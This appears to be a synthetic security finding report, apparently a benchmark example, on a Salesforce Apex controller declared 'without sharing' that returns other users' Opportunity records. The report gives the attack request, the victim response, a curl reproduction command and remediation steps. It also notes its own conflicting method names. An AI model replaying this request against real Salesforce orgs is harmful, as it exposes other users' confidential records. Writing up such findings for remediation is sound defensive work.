# Security Analysis Report
**System:** Horizon Social Graph API (Salesforce-Integrated)
**Domain:** Social Media / Social Graph
**Example ID:** SF-0111
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL and Salesforce record-level access bypass on `OpportunityController.getOpportunity` — attacker reads any social graph Opportunity record |

---

## Finding 1 — Platform: SOQL Record-Level Access Bypass on Opportunity Object (Pattern 9.2)

### Summary
The Apex controller `OpportunityController` on Horizon Social Graph API (`e16d4d1e.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 9.2, the SOQL query interpolates `opportunityId` directly from client input without a `WITH SECURITY_ENFORCED` clause or ownership predicate, bypassing Salesforce record-level access controls entirely.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` while the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://e16d4d1e.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://e16d4d1e.lightning.force.com/aura
Authorization: Bearer 00DE16D4D1E!ARe16d4d1e...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DE16D4D1E!ARe16d4d1e...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"0014D1E","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0014D1E", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-13-2061"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DE16D4D1E!ARe16d4d1e..."
curl -s -X POST "https://e16d4d1e.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0014D1E","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-13-2061
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. Add `WITH SECURITY_ENFORCED` to all SOQL queries.
3. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()`
4. Server-side `fields` allowlist. Validate `aura.token`.
